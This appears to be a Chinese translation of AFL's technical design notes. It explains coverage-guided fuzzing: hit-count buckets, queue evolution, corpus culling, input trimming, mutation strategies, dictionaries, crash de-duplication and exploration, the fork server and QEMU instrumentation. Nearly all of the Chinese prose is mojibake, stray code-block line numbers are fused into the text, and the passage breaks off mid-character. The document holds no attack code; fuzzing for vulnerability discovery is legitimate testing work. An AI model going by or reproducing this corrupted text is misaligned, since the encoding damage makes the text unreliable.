bitmapåˆ™ä¾èµ–äºæ¯ä¸ªfuzzerè®°å½•çš„å·²æ‰§è¡Œçš„tupleçš„å‘½ä¸­æ•°ã€‚å•ä¸ªbucketçš„æ”¹å˜ä¼šè¢«å¿½ç•¥æ‰: åœ¨ç¨‹åºæ§åˆ¶æµä¸­ï¼Œbucketçš„è½¬æ¢ä¼šè¢«æ ‡è®°æˆä¸€ä¸ªinteresting changeï¼Œä¼ å…¥evolutionary(è§ç¬¬ä¸‰éƒ¨åˆ†)è¿›è¡Œå¤„ç†ã€‚é€šè¿‡å‘½ä¸­æ¬¡æ•°(hit count)ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ†è¾¨æ§åˆ¶æµæ˜¯å¦å‘ç”Ÿå˜åŒ–ã€‚ä¾‹å¦‚ä¸€ä¸ªä»£ç å—è¢«æ‰§è¡Œäº†ä¸¤æ¬¡ï¼Œä½†åªå‘½ä¸­äº†ä¸€æ¬¡ã€‚å¹¶ä¸”è¿™ç§æ–¹æ³•å¯¹å¾ªç¯çš„æ¬¡æ•°ä¸æ•æ„Ÿ(å¾ªç¯47æ¬¡å’Œ48æ¬¡æ²¡åŒºåˆ«)ã€‚è¿™ç§ç®—æ³•é€šè¿‡é™åˆ¶å†…å­˜å’Œè¿è¡Œæ—¶é—´æ¥ä¿è¯æ•ˆç‡ã€‚ å¦å¤–ï¼Œç®—æ³•é€šè¿‡è®¾ç½®æ‰§è¡Œè¶…æ—¶ï¼Œæ¥é¿å…æ•ˆç‡è¿‡ä½çš„fuzzã€‚ä»è€Œè¿›ä¸€æ­¥å‘ç°æ•ˆç‡æ¯”è¾ƒé«˜çš„fuzzæ–¹å¼ã€‚ 3ï¼‰è¾“å…¥é˜Ÿåˆ—çš„è¿›åŒ–(Evolving the input queue)ç»å˜å¼‚çš„æµ‹è¯•ç”¨ä¾‹ï¼Œä¼šä½¿ç¨‹åºäº§ç”Ÿ æ–°çš„çŠ¶æ€è½¬ç§» ã€‚è¿™äº›æµ‹è¯•ç”¨ä¾‹ç¨åè¢«æ·»åŠ åˆ° input é˜Ÿåˆ—ä¸­ï¼Œç”¨ä½œä¸‹ä¸€ä¸ª fuzz å¾ªç¯ã€‚å®ƒä»¬è¡¥å……ä½†ä¸æ›¿æ¢ç°æœ‰çš„å‘ç°ã€‚è¿™ç§ç®—æ³•å…è®¸å·¥å…·å¯ä»¥æŒç»­æ¢ç´¢ä¸åŒçš„ä»£ç è·¯å¾„ï¼Œå³ä½¿åº•å±‚çš„æ•°æ®æ ¼å¼å¯èƒ½æ˜¯å®Œå…¨ä¸åŒçš„ã€‚å¦‚ä¸‹å›¾ï¼š è¿™é‡Œæœ‰ä¸€äº›è¿™ç§ç®—æ³•åœ¨å®é™…æƒ…å†µä¸‹ä¾‹å­ï¼š pulling-jpegs-out-of-thin-air afl-fuzz-nobody-expects-cdata-sections è¿™ç§è¿‡ç¨‹ä¸‹äº§ç”Ÿçš„è¯­æ–™åº“åŸºæœ¬ä¸Šæ˜¯è¿™äº›è¾“å…¥æ–‡ä»¶çš„é›†åˆï¼šå®ƒä»¬éƒ½èƒ½è§¦å‘ä¸€äº›æ–°çš„æ‰§è¡Œè·¯å¾„ã€‚äº§ç”Ÿçš„è¯­æ–™åº“ï¼Œå¯ä»¥è¢«ç”¨æ¥ä½œä¸ºå…¶ä»–æµ‹è¯•çš„ç§å­ã€‚ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå¤§å¤šæ•°ç›®æ ‡ç¨‹åºçš„é˜Ÿåˆ—ä¼šå¢åŠ åˆ°å¤§æ¦‚1kåˆ°10kä¸ªentryã€‚å¤§çº¦æœ‰10-30%å½’åŠŸäºå¯¹æ–°tupeçš„å‘ç°ï¼Œå‰©ä¸‹çš„å’Œhit countsæ”¹å˜æœ‰å…³ã€‚ä¸‹è¡¨æ¯”è¾ƒäº†ä¸åŒ fuzzing æ–¹æ³•åœ¨å‘ç°æ–‡ä»¶å¥æ³•(file syntax)å’Œæ¢ç´¢ç¨‹åºæ‰§è¡Œè·¯å¾„çš„èƒ½åŠ›ã€‚æ’æ¡©çš„ç›®æ ‡ç¨‹åºæ˜¯ GNU patch 2.7.3 compiled with -O3 and seeded with a dummy text file: Fuzzer guidance strategy used Blocks reached Edges reached Edge hit cnt var Highest-coverage test case generated (Initial file) 156 163 1.00 (none) Blind fuzzing S 182 205 2.23 First 2 B of RCS diff Blind fuzzing L 228 265 2.23 First 4 B of -c mode diff Block coverage 855 1,130 1.57 Almost-valid RCS diff Edge coverage 1,452 2,070 2.18 One-chunk -c mode diff AFL model 1,765 2,597 4.99 Four-chunk -c mode diff ç¬¬ä¸€è¡Œçš„blind fuzzing (â€œSâ€)ä»£è¡¨ä»…ä»…æ‰§è¡Œäº†ä¸€ä¸ªå›åˆçš„æµ‹è¯•ã€‚ç¬¬äºŒè¡Œçš„Blind fuzzing Lè¡¨ç¤ºåœ¨ä¸€ä¸ªå¾ªç¯ä¸­æ‰§è¡Œäº†å‡ ä¸ªå›åˆçš„æµ‹è¯•ï¼Œä½†æ˜¯æ²¡æœ‰è¿›è¡Œæ”¹è¿›ã€‚å’Œæ’æ¡©è¿è¡Œç›¸æ¯”ï¼Œéœ€è¦æ›´å¤šæ—¶é—´å…¨é¢å¤„ç†å¢é•¿é˜Ÿåˆ—ã€‚ åœ¨å¦ä¸€ä¸ªç‹¬ç«‹çš„å®éªŒä¸­ä¹Ÿå–å¾—äº†å¤§è‡´ç›¸ä¼¼çš„ç»“æœã€‚åœ¨æ–°å®éªŒä¸­ï¼Œfuzzerè¢«ä¿®æ”¹æˆæ‰€æœ‰éšæœºfuzzing ç­–ç•¥ï¼Œåªç•™ä¸‹ä¸€ç³»åˆ—åŸºæœ¬ã€è¿ç»­çš„æ“ä½œï¼Œä¾‹å¦‚ä½åè½¬(bit flips)ã€‚å› ä¸ºè¿™ç§æ¨¡å¼ï¼ˆmodeï¼‰å°†ä¸èƒ½æ”¹å˜è¾“å…¥æ–‡ä»¶çš„çš„å¤§å°ï¼Œä¼šè¯ä½¿ç”¨ä¸€ä¸ªåˆæ³•çš„åˆå¹¶æ ¼å¼ï¼ˆunified diffï¼‰ä½œä¸ºç§å­ã€‚ Queue extension strategy used Blocks reached Edges reached Edge hit cnt var Number of unique crashes found (Initial file) 624 717 1.00 - Blind fuzzing 1,101 1,409 1.60 0 Block coverage 1,255 1,649 1.48 0 Edge coverage 1,259 1,734 1.72 0 AFL model 1,452 2,040 3.16 1 åœ¨ä¹‹å‰æåˆ°çš„åŸºäºé—ä¼ ç®—æ³•çš„fuzzingï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªtest caseçš„è¿›åŒ–(è¿™é‡ŒæŒ‡çš„æ˜¯ç”¨é—ä¼ ç®—æ³•è¿›è¡Œå˜å¼‚)æ¥å®ç°æœ€å¤§è¦†ç›–ã€‚åœ¨ä¸Šè¿°å®éªŒçœ‹æ¥ï¼Œè¿™ç§â€œè´ªå©ªâ€çš„æ–¹æ³•ä¼¼ä¹æ²¡æœ‰ä¸ºç›²ç›®çš„æ¨¡ç³Šç­–ç•¥å¸¦æ¥å®è´¨æ€§çš„å¥½å¤„ã€‚ 4ï¼‰è¯­æ–™ç­›é€‰ï¼ˆCulling the corpusï¼‰ä¸Šæ–‡æåˆ°çš„æ¸è¿›å¼è¯­å¥æ¢ç´¢è·¯å¾„çš„æ–¹æ³•æ„å‘³ç€ï¼šå‡è®¾Aå’ŒBæ˜¯æµ‹è¯•ç”¨ä¾‹(test cases)ï¼Œä¸”Bæ˜¯ç”±Aå˜å¼‚äº§ç”Ÿçš„ã€‚é‚£ä¹ˆæµ‹è¯•ç”¨ä¾‹Bè¾¾åˆ°çš„è¾¹ç¼˜è¦†ç›–ç‡(edge coverage)æ˜¯æµ‹è¯•ç”¨ä¾‹Aè¾¾åˆ°çš„è¾¹ç¼˜è¦†ç›–ç‡çš„ä¸¥æ ¼è¶…é›†(superset)ã€‚ä¸ºäº†ä¼˜åŒ–fuzzingï¼ŒAFLä¼šç”¨ä¸€ä¸ªå¿«é€Ÿç®—æ³•å‘¨æœŸæ€§çš„é‡æ–°è¯„ä¼°(re-evaluates)é˜Ÿåˆ—ï¼Œè¿™ç§ç®—æ³•ä¼šé€‰æ‹©é˜Ÿåˆ—çš„ä¸€ä¸ªæ›´å°çš„å­é›†ï¼Œå¹¶ä¸”è¿™ä¸ªå­é›†ä»èƒ½è¦†ç›–æ‰€æœ‰çš„tupleã€‚ç®—æ³•çš„è¿™ä¸ªç‰¹æ€§å¯¹è¿™ä¸ªå·¥å…·ç‰¹åˆ«æœ‰åˆ©(favorable)ã€‚ç®—æ³•é€šè¿‡æŒ‡å®šæ¯ä¸€ä¸ªé˜Ÿåˆ—å…¥å£(queue entry)ï¼Œæ ¹æ®æ‰§è¡Œæ—¶å»¶ï¼ˆexecution latencyï¼‰å’Œæ–‡ä»¶å¤§å°åˆ†é…ä¸€ä¸ªåˆ†å€¼æ¯”ä¾‹ï¼ˆscore proportionalï¼‰ã€‚ç„¶åä¸ºæ¯ä¸€ä¸ªtupleé€‰æ‹©æœ€ä½åˆ†å€¼çš„entryã€‚è¿™äº›tuplesæŒ‰ä¸‹è¿°æµç¨‹è¿›è¡Œå¤„ç†ï¼š 12345671) Find next tuple not yet in the temporary working set,2) Locate the winning queue entry for this tuple,3) Register *all* tuples present in that entry&apos;s trace in the working set,4) Go to #1 if there are any missing tuples in the set. â€œfavoredâ€ entries äº§ç”Ÿçš„è¯­æ–™ï¼Œä¼šæ¯”åˆå§‹çš„æ•°æ®é›†å°5åˆ°10å€ã€‚æ²¡æœ‰è¢«é€‰æ‹©çš„ä¹Ÿæ²¡æœ‰è¢«æ‰”æ‰ï¼Œè€Œæ˜¯åœ¨é‡åˆ°ä¸‹åˆ—å¯¹é˜Ÿåˆ—æ—¶ï¼Œä»¥ä¸€å®šæ¦‚ç‡ç•¥è¿‡ï¼š12345678- If there are new, yet-to-be-fuzzed favorites present in the queue, 99% of non-favored entries will be skipped to get to the favored ones.- If there are no new favorites:- If the current non-favored entry was fuzzed before, it will be skipped 95% of the time.- If it hasn&apos;t gone through any fuzzing rounds yet, the odds of skipping drop down to 75%. åŸºäºä»¥å¾€çš„å®éªŒç»éªŒï¼Œè¿™ç§æ–¹æ³•èƒ½å¤Ÿåœ¨é˜Ÿåˆ—å‘¨æœŸé€Ÿåº¦(queue cycling speed)å’Œæµ‹è¯•ç”¨ä¾‹å¤šæ ·æ€§(test case diversity)ä¹‹é—´è¾¾åˆ°ä¸€ä¸ªåˆç†çš„å¹³è¡¡ã€‚ä½¿ç”¨afl-cminå·¥å…·èƒ½å¤Ÿå¯¹è¾“å…¥æˆ–è¾“å‡ºçš„è¯­æ–™åº“è¿›è¡Œç¨å¾®å¤æ‚ä½†æ…¢å¾—å¤šçš„çš„å¤„ç†ã€‚è¿™ä¸€å·¥å…·å°†æ°¸ä¹…ä¸¢å¼ƒå†—ä½™entriesï¼Œäº§ç”Ÿé€‚ç”¨äºafl-fuzzæˆ–è€…å¤–éƒ¨å·¥å…·çš„æ›´å°çš„è¯­æ–™åº“ã€‚ 5ï¼‰è¾“å…¥æ–‡ä»¶ä¿®å‰ªï¼ˆTrimming input filesï¼‰æ–‡ä»¶çš„å¤§å°å¯¹fuzzingçš„æ€§èƒ½æœ‰ç€é‡å¤§å½±å“(dramatic impact)ã€‚å› ä¸ºå¤§æ–‡ä»¶ä¼šè®©ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶è¿è¡Œå˜æ…¢ï¼›å¤§æ–‡ä»¶è¿˜ä¼šå‡å°‘å˜å¼‚è§¦åŠé‡è¦æ ¼å¼æ§åˆ¶ç»“æ„(format control structures)çš„å¯èƒ½æ€§(æˆ‘ä»¬å¸Œæœ›çš„æ˜¯å˜å¼‚è¦è§¦åŠå†—ä½™ä»£ç å—(redundant data blocks))ã€‚è¿™ä¸ªé—®é¢˜å°†åœ¨perf_tips.txtç»†è¯´ã€‚ç”¨æˆ·å¯èƒ½æä¾›ä½è´¨é‡åˆå§‹è¯­æ–™(starting corpus)ï¼ŒæŸäº›ç±»å‹çš„å˜å¼‚ä¼šè¿­ä»£åœ°å¢åŠ ç”Ÿæˆæ–‡ä»¶çš„å¤§å°ã€‚æ‰€ä»¥è¦æŠ‘åˆ¶è¿™ç§è¶‹åŠ¿(counter this trend)ã€‚å¹¸è¿çš„æ˜¯ï¼Œæ’æ¡©åé¦ˆ(instrumentation feedback)æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹å¼è‡ªåŠ¨å‰Šå‡ï¼ˆtrim downï¼‰è¾“å…¥æ–‡ä»¶ï¼Œå¹¶ç¡®ä¿è¿™äº›æ”¹å˜èƒ½ä½¿å¾—æ–‡ä»¶å¯¹æ‰§è¡Œè·¯å¾„æ²¡æœ‰å½±å“ã€‚afl-fuzzå†…ç½®çš„ä¿®å‰ªå™¨(trimmer)ä½¿ç”¨å˜åŒ–çš„é•¿åº¦å’Œæ­¥è·(variable length and stepover)æ¥è¿ç»­åœ°(sequentially)åˆ é™¤æ•°æ®å—ï¼›ä»»ä½•ä¸å½±å“trace mapçš„æ ¡éªŒå’Œ(checksum)çš„åˆ é™¤å—å°†è¢«æäº¤åˆ°diskã€‚è¿™ä¸ªä¿®å‰ªå™¨çš„è®¾è®¡å¹¶ä¸ç®—ç‰¹åˆ«åœ°å‘¨å¯†(thorough)ï¼Œç›¸ååœ°ï¼Œå®ƒè¯•ç€åœ¨ç²¾ç¡®åº¦(precision)å’Œè¿›ç¨‹è°ƒç”¨execve()çš„æ¬¡æ•°ä¹‹é—´é€‰å–ä¸€ä¸ªå¹³è¡¡ï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„block sizeå’Œstepoverã€‚å¹³å‡æ¯ä¸ªæ–‡ä»¶å°†å¢å¤§çº¦5-20%ã€‚ç‹¬ç«‹çš„afl-tminå·¥å…·ä½¿ç”¨æ›´å®Œæ•´(exhaustive)ã€è¿­ä»£æ¬¡æ•°æ›´å¤š(iteractive)çš„ç®—æ³•ï¼Œå¹¶å°è¯•å¯¹è¢«ä¿®å‰ªçš„æ–‡ä»¶é‡‡ç”¨å­—æ¯æ ‡å‡†åŒ–çš„æ–¹å¼å¤„ç†ã€‚ 6) æ¨¡ç³Šæµ‹è¯•ç­–ç•¥(Fuzzing strategies)æ’æ¡©æä¾›çš„åé¦ˆ(feedback)ä½¿å¾—æˆ‘ä»¬æ›´å®¹æ˜“ç†è§£å„ç§ä¸åŒfuzzingç­–ç•¥çš„ä»·å€¼ï¼Œä»è€Œä¼˜åŒ–(optimize)ä»–ä»¬çš„å‚æ•°ã€‚ä½¿å¾—ä»–ä»¬å¯¹ä¸åŒçš„æ–‡ä»¶ç±»å‹éƒ½èƒ½åŒç­‰åœ°è¿›è¡Œå·¥ä½œã€‚afl-fuzzç”¨çš„ç­–ç•¥é€šå¸¸æ˜¯ä¸æ ¼å¼æ— å…³ï¼ˆformat-agnosticï¼‰ï¼Œè¯¦ç»†è¯´æ˜åœ¨ä¸‹è¾¹çš„è¿æ¥ä¸­ï¼šbinary-fuzzing-strategies-what-workså€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œafl-fuzzå¤§éƒ¨åˆ†çš„(å°¤å…¶æ˜¯å‰æœŸçš„)å·¥ä½œéƒ½æ˜¯é«˜åº¦ç¡®å®šçš„(highly deterministic)ï¼Œéšæœºæ€§ä¿®æ”¹å’Œæµ‹è¯•ç”¨ä¾‹æ‹¼æ¥(random stacked modificationså’Œtest case splicing)åªåœ¨åæœŸçš„éƒ¨åˆ†è¿›è¡Œã€‚ ç¡®å®šæ€§çš„ç­–ç•¥ åŒ…æ‹¬ï¼š12345- Sequential bit flips with varying lengths and stepovers,ä½¿ç”¨å˜åŒ–çš„é•¿åº¦å’Œæ­¥è·æ¥è¿ç»­è¿›è¡Œä½åè½¬- Sequential addition and subtraction of small integers,å¯¹å°çš„æ•´å‹æ•°æ¥è¿ç»­è¿›è¡ŒåŠ æ³•å’Œå‡æ³•- Sequential insertion of known interesting integers (0, 1, INT_MAX, etc),å¯¹å·²çŸ¥çš„æ„Ÿå…´è¶£çš„æ•´å‹æ•°è¿ç»­åœ°æ’å…¥ ä½¿ç”¨è¿™äº›ç¡®å®šæ­¥éª¤çš„ç›®çš„åœ¨äºï¼Œç”Ÿæˆç´§å‡‘çš„(compact)æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥åŠåœ¨äº§ç”Ÿnon-crashingçš„è¾“å…¥å’Œäº§ç”Ÿcrashingçš„è¾“å…¥ä¹‹é—´ï¼Œæœ‰å¾ˆå°çš„å·®å¼‚(small diffs)ã€‚éç¡®å®šæ€§(non-deterministic)ç­–ç•¥ çš„æ­¥éª¤åŒ…æ‹¬ï¼šstacked bit flipsã€æ’å…¥(insertions)ã€åˆ é™¤(deletions)ã€ç®—æ•°(arithmetics)å’Œä¸åŒæµ‹è¯•ç”¨ä¾‹ä¹‹é—´çš„æ‹¼æ¥(splicing)ã€‚ ç”±äºåœ¨historical_notes.txt ä¸­æåˆ°çš„åŸå› (æ€§èƒ½ã€ç®€æ˜“æ€§ã€å¯é æ€§)ï¼ŒAFLé€šå¸¸ä¸è¯•å›¾å»æ¨æ–­æŸä¸ªç‰¹å®šçš„å˜å¼‚(specific mutations)å’Œç¨‹åºçŠ¶æ€(program states)çš„å…³ç³»ã€‚ fuzzingçš„æ­¥éª¤åä¹‰ä¸Šæ¥è¯´æ˜¯ç›²ç›®çš„(nominally blind)ï¼Œåªè¢«è¾“å…¥é˜Ÿåˆ—çš„è¿›åŒ–æ–¹å¼çš„è®¾è®¡æ‰€å½±å“(è§ç¬¬ä¸‰éƒ¨åˆ†)ã€‚ è¿™æ„å‘³ç€ï¼Œè¿™æ¡è§„åˆ™æœ‰ä¸€ä¸ªä¾‹å¤–ï¼šå½“ä¸€ä¸ªæ–°çš„é˜Ÿåˆ—æ¡ç›®ï¼Œç»è¿‡åˆå§‹çš„ç¡®å®šæ€§fuzzingæ­¥éª¤é›†åˆæ—¶ï¼Œå¹¶ä¸”æ–‡ä»¶çš„éƒ¨åˆ†åŒºåŸŸè¢«è§‚æµ‹åˆ°å¯¹æ‰§è¡Œè·¯å¾„çš„æ ¡éªŒå’Œæ²¡æœ‰å½±å“ï¼Œè¿™äº›é˜Ÿåˆ—æ¡ç›®åœ¨æ¥ä¸‹æ¥çš„ç¡®å®šæ€§fuzzingé˜¶æ®µå¯èƒ½ä¼šè¢«æ’é™¤ã€‚å°¤å…¶æ˜¯å¯¹é‚£äº›å†—é•¿çš„æ•°æ®æ ¼å¼ï¼Œè¿™å¯ä»¥åœ¨ä¿æŒè¦†ç›–ç‡ä¸å˜çš„æƒ…å†µä¸‹ï¼Œå‡å°‘10-40%çš„æ‰§è¡Œæ¬¡æ•°ã€‚åœ¨ä¸€äº›æç«¯æƒ…å†µä¸‹ï¼Œæ¯”å¦‚ä¸€äº›block-alignedçš„taræ–‡ä»¶ï¼Œè¿™ä¸ªæ•°å­—å¯ä»¥è¾¾åˆ°90%ã€‚ 7) å­—å…¸(Dictionaries)æ’æ¡©æä¾›çš„åé¦ˆèƒ½å¤Ÿè®©å®ƒè‡ªåŠ¨åœ°è¯†åˆ«å‡ºä¸€äº›è¾“å…¥æ–‡ä»¶ä¸­çš„è¯­æ³•(syntax)ç¬¦å·(tokens)ï¼Œå¹¶ä¸”èƒ½å¤Ÿä¸ºæµ‹è¯•å™¨(tested parser)æ£€æµ‹åˆ°ä¸€äº›ç»„åˆï¼Œè¿™äº›ç»„åˆæ˜¯ç”±é¢„å®šä¹‰(predefined)çš„æˆ–è‡ªåŠ¨æ£€æµ‹åˆ°çš„(auto-detected)å­—å…¸é¡¹(dictionary terms)æ„æˆçš„åˆæ³•è¯­æ³•(valid grammar)ã€‚å…³äºè¿™äº›ç‰¹ç‚¹åœ¨afl-fuzzæ˜¯å¦‚ä½•å®ç°çš„ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªé“¾æ¥ï¼šafl-fuzz-making-up-grammar-withå¤§ä½“ä¸Šï¼Œå½“åŸºæœ¬çš„(basic, typically easily-obtained)å¥æ³•(syntax)ç¬¦å·(tokens)ä»¥çº¯ç²¹éšæœºçš„æ–¹å¼ç»„åˆåœ¨ä¸€èµ·æ—¶ï¼Œæ’æ¡©å’Œé˜Ÿåˆ—è¿›åŒ–è¿™ä¸¤ç§æ–¹æ³•å…±åŒæä¾›äº†ä¸€ç§åé¦ˆæœºåˆ¶ï¼Œè¿™ç§åé¦ˆæœºåˆ¶èƒ½å¤ŸåŒºåˆ†æ— æ„ä¹‰çš„å˜å¼‚å’Œåœ¨æ’æ¡©ä»£ç ä¸­è§¦å‘æ–°è¡Œä¸ºçš„å˜å¼‚ã€‚è¿™æ ·èƒ½å¢é‡åœ°æ„å»ºæ›´å¤æ‚çš„å¥æ³•(syntax)ã€‚è¿™æ ·æ„å»ºçš„å­—å…¸èƒ½å¤Ÿè®©fuzzerå¿«é€Ÿåœ°é‡æ„éå¸¸è¯¦ç»†(highly verbose)ä¸”å¤æ‚çš„(complex)è¯­æ³•ï¼Œæ¯”å¦‚JavaScript, SQL,XMLã€‚ä¸€äº›ç”ŸæˆSQLè¯­å¥çš„ä¾‹å­å·²ç»åœ¨ä¹‹å‰æåˆ°çš„åšå®¢ä¸­ç»™å‡ºäº†ã€‚æœ‰è¶£çš„æ˜¯ï¼ŒAFLçš„æ’æ¡©ä¹Ÿå…è®¸fuzzerè‡ªåŠ¨åœ°éš”ç¦»(isolate)å·²ç»åœ¨è¾“å…¥æ–‡ä»¶ä¸­å‡ºç°è¿‡çš„å¥æ³•(syntax)ç¬¦å·(tokens)ã€‚ 8) å´©æºƒå»é‡ï¼ˆDe-duping crashesï¼‰å´©æºƒå»é‡æ˜¯fuzzingå·¥å…·é‡Œå¾ˆé‡è¦çš„é—®é¢˜ä¹‹ä¸€ã€‚å¾ˆå¤šnaiveçš„è§£å†³æ–¹å¼éƒ½ä¼šæœ‰è¿™æ ·çš„é—®é¢˜ï¼šå¦‚æœè¿™ä¸ªé”™è¯¯å‘ç”Ÿåœ¨ä¸€ä¸ªæ™®é€šçš„åº“å‡½æ•°ä¸­(å¦‚say, strcmp, strcpy)ï¼Œåªå…³æ³¨å‡ºé”™åœ°å€(faulting address)çš„è¯ï¼Œé‚£ä¹ˆå¯èƒ½å¯¼è‡´ä¸€äº›å®Œå…¨ä¸ç›¸å…³çš„é—®é¢˜è¢«åˆ†åœ¨ä¸€ç±»(clustered together)ã€‚å¦‚æœé”™è¯¯å‘ç”Ÿåœ¨ä¸€äº›ä¸åŒçš„ã€å¯èƒ½é€’å½’çš„ä»£ç è·¯å¾„ä¸­ï¼Œé‚£ä¹ˆæ ¡éªŒå’Œ(checksumming)è°ƒç”¨æ ˆå›æº¯(call stack backtraces)æ—¶å¯èƒ½å¯¼è‡´crash count inflation(é€šèƒ€)ã€‚ afl-fuzzçš„è§£å†³æ–¹æ¡ˆè®¤ä¸ºæ»¡è¶³ä¸€ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªcrashå°±æ˜¯å”¯ä¸€çš„(unique)ï¼š12- The crash trace includes a tuple not seen in any of the previous crashes,è¿™ä¸ªcrashçš„è·¯å¾„åŒ…æ‹¬ä¸€ä¸ªä¹‹å‰crashä»æœªè§åˆ°è¿‡çš„tupleã€‚- The crash trace is missing a tuple that was always present in earlier faults.è¿™ä¸ªcrashçš„è·¯å¾„ä¸åŒ…å«ä¸€ä¸ªæ€»åœ¨ä¹‹å‰crashä¸­å‡ºç°çš„tupleã€‚ è¿™ç§æ–¹å¼ä¸€å¼€å§‹å®¹æ˜“å—åˆ°count inflationçš„å½±å“ï¼Œä½†å®éªŒè¡¨æ˜å…¶æœ‰å¾ˆå¼ºçš„è‡ªæˆ‘é™åˆ¶æ•ˆæœã€‚å’Œæ‰§è¡Œè·¯å¾„åˆ†æä¸€æ ·ï¼Œè¿™ç§ å´©æºƒå»é‡ çš„æ–¹å¼æ˜¯afl-fuzzçš„åŸºçŸ³(cornerstone)ã€‚ 9) å´©æºƒè°ƒæŸ¥(Investigating crashes)ä¸åŒçš„crashçš„å¯ç”¨æ€§(exploitability)æ˜¯ä¸åŒçš„ã€‚afl-fuzzæä¾›ä¸€ä¸ªcrashçš„æ¢ç´¢æ¨¡å¼(exploration mode)æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å¯¹ä¸€ä¸ªå·²çŸ¥çš„å‡ºé”™æµ‹è¯•ç”¨ä¾‹ï¼Œå®ƒè¢«fuzzçš„æ–¹å¼å’Œæ­£å¸¸fuzzçš„æ“ä½œæ²¡ä»€ä¹ˆä¸åŒï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé™åˆ¶èƒ½è®©ä»»ä½•non-crashing çš„å˜å¼‚(mutations)ä¼šè¢«ä¸¢å¼ƒ(thrown away)ã€‚è¿™ç§æ–¹æ³•çš„æ„ä¹‰åœ¨ä»¥ä¸‹é“¾æ¥ä¸­ä¼šè¿›ä¸€æ­¥è®¨è®ºï¼šafl-fuzz-crash-exploration-modeè¿™ç§æ–¹æ³•åˆ©ç”¨instrumentationçš„åé¦ˆï¼Œæ¢ç´¢crashç¨‹åºçš„çŠ¶æ€ï¼Œä»è€Œè¿›ä¸€æ­¥é€šè¿‡æ­§ä¹‰æ€§çš„å¤±è´¥æ¡ä»¶ï¼Œæ‰¾åˆ°äº†æœ€æ–°å‘ç°çš„inputã€‚å¯¹äºcrashesæ¥è¯´ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯å’Œæ­£å¸¸çš„é˜Ÿåˆ—æ¡ç›®å¯¹æ¯”ï¼Œå¯¼è‡´crashçš„inputæ²¡æœ‰è¢«å»æ‰ï¼Œä¸ºäº†å’Œå®ƒä»¬çš„çˆ¶æ¡ç›®ï¼ˆé˜Ÿåˆ—ä¸­æ²¡æœ‰å¯¼è‡´crashçš„æ¡ç›®ï¼‰å¯¹æ¯”ï¼Œå®ƒä»¬è¢«ä¿å­˜ä¸‹æ¥ï¼Œè¿™å°±æ˜¯è¯´afl-tminå¯ä»¥è¢«ç”¨æ¥éšæ„ç¼©å‡å®ƒä»¬ã€‚ 10) The fork serverä¸ºäº†æå‡æ€§èƒ½ï¼Œafl-fuzzä½¿ç”¨äº†ä¸€ä¸ªâ€fork serverâ€ï¼Œfuzzçš„è¿›ç¨‹åªè¿›è¡Œä¸€æ¬¡execve(), è¿æ¥(linking), åº“åˆå§‹åŒ–(libc initialization)ã€‚fuzzè¿›ç¨‹é€šè¿‡copy-on-write(å†™æ—¶æ‹·è´æŠ€æœ¯)ä»å·²åœæ­¢çš„fuzzè¿›ç¨‹ä¸­cloneä¸‹æ¥ã€‚å®ç°ç»†èŠ‚åœ¨ä»¥ä¸‹é“¾æ¥ä¸­ï¼šfuzzing-binaries-without-execvefork serverè¢«é›†æˆåœ¨äº†instrumentationçš„ç¨‹åºä¸‹ï¼Œåœ¨ç¬¬ä¸€ä¸ªinstrumentå‡½æ•°æ‰§è¡Œæ—¶ï¼Œfork serverå°±åœæ­¢å¹¶ç­‰å¾…afl-fuzzçš„å‘½ä»¤ã€‚å¯¹äºéœ€è¦å¿«é€Ÿå‘åŒ…çš„æµ‹è¯•ï¼Œfork serverå¯ä»¥æå‡1.5åˆ°2å€çš„æ€§èƒ½ã€‚ 11) å¹¶è¡Œæœºåˆ¶å®ç°å¹¶è¡Œçš„æœºåˆ¶æ˜¯ï¼Œå®šæœŸæ£€æŸ¥ä¸åŒcpu coreæˆ–ä¸åŒæœºå™¨äº§ç”Ÿçš„é˜Ÿåˆ—ï¼Œç„¶åæœ‰é€‰æ‹©æ€§çš„æŠŠé˜Ÿåˆ—ä¸­çš„æ¡ç›®æ”¾åˆ°test casesä¸­ã€‚è¯¦è§ï¼š parallel_fuzzing.txt. 12ï¼‰äºŒè¿›åˆ¶instrumentationAFL-Fuzzå¯¹äºŒè¿›åˆ¶é»‘ç›’ç›®æ ‡ç¨‹åºçš„instrumentationæ˜¯é€šè¿‡QEMUçš„â€œuser emulationâ€æ¨¡å¼å®ç°çš„ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å…è®¸è·¨æ¶æ„çš„è¿è¡Œï¼Œæ¯”å¦‚ARM binariesè¿è¡Œåœ¨X86çš„æ¶æ„ä¸Šã€‚QEMUä½¿ç”¨basic blocksä½œä¸ºç¿»è¯‘å•å…ƒï¼Œåˆ©ç”¨QEMUåšinstrumentationï¼Œå†ä½¿ç”¨ä¸€ä¸ªå’Œç¼–è¯‘æœŸinstrumentationç±»ä¼¼çš„guided fuzzçš„æ¨¡å‹ã€‚1234567if (block_address &gt; elf_text_start &amp;&amp; block_address &lt; elf_text_end) &#123; cur_location = (block_address &gt;&gt; 4) ^ (block_address &lt;&lt; 8); shared_mem[cur_location ^ prev_location]++; prev_location = cur_location &gt;&gt; 1;&#125; åƒQEMU, DynamoRIO, and PINè¿™æ ·çš„äºŒè¿›åˆ¶ç¿»è¯‘å™¨ï¼Œå¯åŠ¨æ˜¯å¾ˆæ…¢çš„ã€‚QEMU modeåŒæ ·ä½¿ç”¨äº†ä¸€ä¸ªfork serverï¼Œå’Œç¼–è¯‘æœŸä¸€æ 